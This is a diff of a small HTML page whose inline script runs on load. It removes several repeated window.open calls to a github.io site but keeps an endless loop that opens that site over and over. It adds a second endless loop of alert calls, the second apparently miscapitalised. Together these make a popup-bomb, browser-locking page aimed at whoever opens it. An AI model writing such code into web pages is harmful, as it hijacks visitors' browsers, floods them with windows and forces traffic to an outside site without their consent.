@@ -5,14 +5,10 @@ body {
 background-color: lightblue}
 </style>
 <script>
-window.open("https://cassius-root.github.io")
-window.open("https://cassius-root.github.io")
-window.open("https://cassius-root.github.io")
-window.open("https://cassius-root.github.io")
-window.open("https://cassius-root.github.io")
-window.open("https://cassius-root.github.io")
-window.open("https://cassius-root.github.io")
 var a = true
 while (a == true)
   window.open("https://cassius-root.github.io")
+var B = true
+while (B == true)
+  Alert()
 </script>
